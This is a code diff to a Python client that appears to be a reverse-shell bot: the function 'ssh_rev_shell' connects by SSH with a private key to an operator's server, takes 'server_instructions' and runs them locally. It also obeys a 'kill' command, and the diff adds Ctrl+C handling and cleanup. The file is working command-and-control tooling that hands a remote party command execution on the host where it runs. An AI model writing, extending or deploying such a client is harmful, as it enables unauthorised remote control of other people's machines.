@@ -3,10 +3,50 @@
 # This is a basic client for executing a command
 
 import os
+import sys
 import time
+import signal
 import threading
 import paramiko
 import subprocess
+
+# Global variables to track SSH client and session
+ssh_client = None
+ssh_session = None
+process = None
+
+def exit_gracefully():
+    global ssh_client, ssh_session, process
+    
+    print("\n\n[!] Exiting gracefully...")
+
+    # Close SSH session and client if open
+    if ssh_session and ssh_session.active:
+        ssh_session.close()
+        print("[!] SSH session closed.")
+    
+    if ssh_client:
+        ssh_client.close()
+        print("[!] SSH client disconnected.")
+    
+    # Terminate subprocess if it’s still running
+    if process and process.poll() is None:
+        process.terminate()
+        process.wait()
+        print("[!] Subprocess terminated.")
+
+    # Exit the program
+    sys.exit(0)
+
+# Signal handler function to catch Ctrl+C
+def signal_handler(sig, frame):
+    exit_gracefully()
+
+# Register the signal handler for SIGINT (Ctrl+C)
+signal.signal(signal.SIGINT, signal_handler)
+
+
+
 
 # This method receives an encoded command
 def exec_underlying_command(command):
@@ -27,19 +67,20 @@ def exec_underlying_command(command):
 
 
 def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
-    client = paramiko.SSHClient()
+    global ssh_client, ssh_session
+    ssh_client = paramiko.SSHClient()
 
     # Load host keys if available, or use AutoAddPolicy to add new ones
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
     # Load the private key from a file
     private_key = paramiko.RSAKey.from_private_key_file(key_file)
     
     # Connect to the SSH server using the private key
-    client.connect(ip, username=user, pkey=private_key, port=port)
+    ssh_client.connect(ip, username=user, pkey=private_key, port=port)
 
     # Open a session and execute the command
-    ssh_session = client.get_transport().open_session()
+    ssh_session = ssh_client.get_transport().open_session()
         
     server_instructions = None
 
@@ -57,9 +98,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             # Handle termination command
             if server_instructions == 'kill':
                 print("[!] Session terminated by the server!")
-                ssh_session.close()
-                client.close()
-                return
+                exit_gracefully()
 
             # Execute command on the channel and capture output
             print("Trying to execute the command")
@@ -71,12 +110,11 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
             #server_instructions = "kill"
             ssh_session.close()
-            client.close()
+            ssh_client.close()
             return
             
     time.sleep(1)
 
-    client.close()
 
 if __name__ == "__main__":
 
